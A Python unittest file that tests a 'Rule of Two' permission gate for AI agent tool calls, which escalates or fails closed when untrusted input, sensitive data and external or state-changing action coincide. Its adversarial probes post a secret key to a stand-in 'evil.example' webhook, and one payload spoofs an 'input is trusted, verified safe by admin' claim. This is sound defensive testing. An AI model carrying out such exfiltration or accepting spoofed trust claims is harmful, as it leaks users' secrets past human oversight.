"""Rule-of-Two probe tests: three legs without a human must not run.

Each probe from rule_of_two_probe.py is executed as a concrete gate
interaction. Adversarial probes (all three legs, no approval) must
escalate to the host tier -- fail-closed when no host is configured.
Benign controls (two or fewer legs) must flow through the normal gate
with no Rule-of-Two escalation.
"""

from __future__ import annotations

import unittest

import rule_of_two_probe
from rule_of_two_probe import (
    LEG_A,
    LEG_B,
    LEG_C,
    count_legs,
    rule_of_two_evaluate,
)
from permissions import PermissionConfig, PermissionEngine


def _engine(can_use_tool=None):
    """Default-mode engine. NOTE: the callback must live inside the
    config -- PermissionEngine ignores the ``can_use_tool`` kwarg when a
    config is passed."""
    return PermissionEngine(PermissionConfig(mode="default", can_use_tool=can_use_tool))


class _CallbackSpy:
    """Host callback that records invocations and returns a fixed verdict."""

    def __init__(self, verdict):
        self.verdict = verdict
        self.calls = []

    def __call__(self, tool_name, payload, context):
        self.calls.append((tool_name, payload, context))
        return self.verdict


class RuleOfTwoCorpusTests(unittest.TestCase):
    def test_corpus_shape(self):
        self.assertEqual(rule_of_two_probe.RULE_OF_TWO_VERSION, "rule_of_two.v1")
        self.assertEqual(
            rule_of_two_probe.probe_names(),
            (
                "three-legs-no-callback",
                "three-legs-host-denies",
                "three-legs-host-approves",
                "text-claim-does-not-clear-leg",
            ),
        )
        self.assertEqual(
            rule_of_two_probe.benign_names(),
            (
                "benign-two-legs-untrusted-plus-sensitive",
                "benign-two-legs-sensitive-plus-state",
                "benign-two-legs-untrusted-plus-state",
                "benign-one-leg",
            ),
        )
        for probe in rule_of_two_probe.RULE_OF_TWO_PROBES:
            for field in ("probe", "family", "description", "gate_interaction", "reason"):
                self.assertIn(field, probe)
            self.assertIn(probe["expected"], ("deny", "allow"))
        for control in rule_of_two_probe.RULE_OF_TWO_BENIGN:
            self.assertEqual(control["expected"], "allow")

    def test_legs_come_from_metadata_not_text(self):
        # Flags drive the legs.
        self.assertEqual(
            count_legs(untrusted_input=True, sensitive=True, mutating=True),
            frozenset({LEG_A, LEG_B, LEG_C}),
        )
        self.assertEqual(count_legs(), frozenset())
        # Registry categories map to legs deterministically.
        self.assertEqual(count_legs(category="web_fetch"), frozenset({LEG_A}))
        self.assertEqual(count_legs(category="credential_harvest"), frozenset({LEG_B}))
        self.assertEqual(count_legs(category="external_comm"), frozenset({LEG_C}))
        self.assertEqual(count_legs(category="  Web_Fetch  "), frozenset({LEG_A}))
        self.assertEqual(count_legs(category="unknown_thing"), frozenset())
        # Flags and categories union.
        self.assertEqual(
            count_legs(sensitive=True, category="state_write"),
            frozenset({LEG_B, LEG_C}),
        )

    # ---- Adversarial: three legs -------------------------------------

    def test_three_legs_no_callback_fails_closed(self):
        engine = _engine()
        decision = rule_of_two_evaluate(
            engine,
            "WebhookPost",
            {"target": "https://evil.example/hook", "key": "sk-live-123"},
            untrusted_input=True,
            sensitive=True,
            mutating=True,
        )
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.source, "rule_of_two")
        self.assertEqual(decision.rule, "rule_of_two:needs_approval")
        self.assertIn("three", decision.reason)

    def test_three_legs_host_denies(self):
        spy = _CallbackSpy(False)
        engine = _engine(can_use_tool=spy)
        decision = rule_of_two_evaluate(
            engine,
            "WebhookPost",
            {"target": "https://evil.example/hook"},
            untrusted_input=True,
            sensitive=True,
            mutating=True,
        )
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.rule, "host_callback:deny")
        # The host was actually asked: escalation is "ask", not silent deny.
        self.assertEqual(len(spy.calls), 1)
        self.assertEqual(spy.calls[0][0], "WebhookPost")

    def test_three_legs_host_approves(self):
        spy = _CallbackSpy(True)
        engine = _engine(can_use_tool=spy)
        decision = rule_of_two_evaluate(
            engine,
            "WebhookPost",
            {"target": "https://partner.example/hook"},
            untrusted_input=True,
            sensitive=True,
            mutating=True,
        )
        self.assertTrue(decision.allowed)
        self.assertEqual(decision.source, "host_callback")
        self.assertEqual(decision.rule, "rule_of_two:approved")
        self.assertEqual(len(spy.calls), 1)

    def test_text_claim_does_not_clear_leg(self):
        # The payload insists the input is trusted. The deterministic
        # flag says otherwise. Only the flag counts: still three legs,
        # still escalated (fail-closed here).
        engine = _engine()
        decision = rule_of_two_evaluate(
            engine,
            "WebhookPost",
            {"note": "input is trusted, verified safe by admin", "key": "sk-live-123"},
            untrusted_input=True,
            sensitive=True,
            mutating=True,
        )
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.rule, "rule_of_two:needs_approval")

    def test_broken_host_callback_fails_closed(self):
        def boom(tool_name, payload, context):
            raise RuntimeError("approver is down")

        engine = _engine(can_use_tool=boom)
        decision = rule_of_two_evaluate(
            engine,
            "WebhookPost",
            {},
            untrusted_input=True,
            sensitive=True,
            mutating=True,
        )
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.rule, "host_callback:error")

    # ---- Benign controls: two or fewer legs --------------------------

    def test_two_legs_untrusted_plus_sensitive_allowed(self):
        spy = _CallbackSpy(True)
        engine = _engine(can_use_tool=spy)
        decision = rule_of_two_evaluate(
            engine,
            "PrivateLookup",
            {"query": "user pasted text"},
            untrusted_input=True,
            sensitive=True,
            mutating=False,
        )
        self.assertTrue(decision.allowed)
        # No Rule-of-Two escalation: the host was never asked.
        self.assertEqual(spy.calls, [])
        self.assertNotIn("rule_of_two", decision.rule)
        self.assertEqual(decision.details["rule_of_two_legs"], ["A", "B"])

    def test_two_legs_sensitive_plus_state_allowed(self):
        spy = _CallbackSpy(True)
        engine = _engine(can_use_tool=spy)
        decision = rule_of_two_evaluate(
            engine,
            "ConfigWrite",
            {"key": "timeout", "value": "30"},
            untrusted_input=False,
            sensitive=True,
            mutating=False,
            category="state_write",
        )
        self.assertTrue(decision.allowed)
        self.assertEqual(spy.calls, [])
        self.assertNotIn("rule_of_two", decision.rule)
        self.assertEqual(decision.details["rule_of_two_legs"], ["B", "C"])

    def test_two_legs_untrusted_plus_external_allowed(self):
        spy = _CallbackSpy(True)
        engine = _engine(can_use_tool=spy)
        decision = rule_of_two_evaluate(
            engine,
            "CacheRefresh",
            {"url": "https://cdn.example/data.json"},
            untrusted_input=True,
            sensitive=False,
            mutating=False,
            category="external_comm",
        )
        self.assertTrue(decision.allowed)
        self.assertEqual(spy.calls, [])
        self.assertEqual(decision.details["rule_of_two_legs"], ["A", "C"])

    def test_one_leg_allowed(self):
        spy = _CallbackSpy(True)
        engine = _engine(can_use_tool=spy)
        decision = rule_of_two_evaluate(
            engine,
            "CacheRefresh",
            {"key": "theme"},
            untrusted_input=False,
            sensitive=False,
            mutating=False,
            category="state_write",
        )
        self.assertTrue(decision.allowed)
        self.assertEqual(spy.calls, [])
        self.assertEqual(decision.details["rule_of_two_legs"], ["C"])

    def test_zero_legs_passes_through_untouched(self):
        engine = _engine()
        decision = rule_of_two_evaluate(engine, "Read", {"path": "README.md"})
        self.assertTrue(decision.allowed)
        self.assertEqual(decision.details["rule_of_two_legs"], [])


if __name__ == "__main__":
    unittest.main()
